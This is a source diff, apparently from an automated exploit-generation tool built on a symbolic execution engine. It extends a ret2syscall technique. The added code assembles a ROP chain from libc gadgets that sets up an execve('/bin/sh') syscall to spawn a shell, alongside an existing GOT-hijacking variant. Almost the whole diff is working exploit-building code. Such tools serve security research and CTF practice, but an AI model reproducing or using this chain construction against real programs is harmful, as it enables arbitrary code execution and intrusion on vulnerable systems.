@@ -49,10 +49,50 @@ Ret2syscall::Ret2syscall()
 
 
 bool Ret2syscall::checkRequirements() const {
-    return Technique::checkRequirements() && m_syscallGadget;
+    return Technique::checkRequirements();
 }
 
 std::vector<RopPayload> Ret2syscall::getRopPayloadList() const {
+    // If we've already leaked libc base, then use the gadgets from libc.
+    if (m_syscallGadget) {
+        return getRopPayloadListUsingGotHijacking();
+    } else {
+        return getRopPayloadListUsingLibcRop();
+    }
+}
+
+std::vector<RopPayload> Ret2syscall::getRopPayloadListUsingLibcRop() const {
+    const Exploit &exploit = g_crax->getExploit();
+    const ELF &libc = exploit.getLibc();
+
+    // Search libc of "/bin/sh".
+    S2EExecutionState *state = g_crax->getCurrentState();
+    std::string needleStr = "/bin/sh";
+    std::vector<uint8_t> needle(needleStr.begin(), needleStr.end());
+    std::vector<uint64_t> addresses = mem(state).search(needle);
+    assert(addresses.size() && "No /bin/sh in libc.so.6?");
+
+    uint64_t binshAddr = addresses[0];
+    uint64_t libcBase = mem(state).vmmap().getModuleBaseAddress(binshAddr);
+    uint64_t binshOffset = binshAddr - libcBase;
+
+    RopPayload payload = {
+        ConstantExpr::create(0, Expr::Int64),  // Saved RBP
+        BaseOffsetExpr::create<BaseType::VAR>(libc, exploit.resolveGadget(libc, "pop rax ; ret")),
+        ConstantExpr::create(59, Expr::Int64),
+        BaseOffsetExpr::create<BaseType::VAR>(libc, exploit.resolveGadget(libc, "pop rdi ; ret")),
+        BaseOffsetExpr::create<BaseType::VAR>(libc, binshOffset),
+        BaseOffsetExpr::create<BaseType::VAR>(libc, exploit.resolveGadget(libc, "pop rsi ; ret")),
+        ConstantExpr::create(0, Expr::Int64),
+        BaseOffsetExpr::create<BaseType::VAR>(libc, exploit.resolveGadget(libc, "pop rdx ; ret")),
+        ConstantExpr::create(0, Expr::Int64),
+        BaseOffsetExpr::create<BaseType::VAR>(libc, exploit.resolveGadget(libc, "syscall")),
+    };
+
+    return { payload };
+}
+
+std::vector<RopPayload> Ret2syscall::getRopPayloadListUsingGotHijacking() const {
     const Exploit &exploit = g_crax->getExploit();
     const ELF &elf = exploit.getElf();
 
@@ -99,13 +139,13 @@ std::vector<RopPayload> Ret2syscall::getRopPayloadList() const {
     ret1.insert(ret1.end(), part2.begin(), part2.end());
     ret1.insert(ret1.end(), part3.begin(), part3.end());
     ret1.insert(ret1.end(), part4.begin(), part4.end());
-    ret2 = { ByteVectorExpr::create(std::vector<uint8_t> { getLsbOfReadSyscall() }) };
+    ret2 = { ByteVectorExpr::create(std::vector<uint8_t> { getLibcReadSyscallOffsetLsb() }) };
     ret3 = { ByteVectorExpr::create(ljust("/bin/sh", 59, 0x00)) };
 
     return { ret1, ret2, ret3 };
 }
 
-uint8_t Ret2syscall::getLsbOfReadSyscall() const {
+uint8_t Ret2syscall::getLibcReadSyscallOffsetLsb() const {
     const ELF &libc = g_crax->getExploit().getLibc();
 
     // Get __read() info from libc.
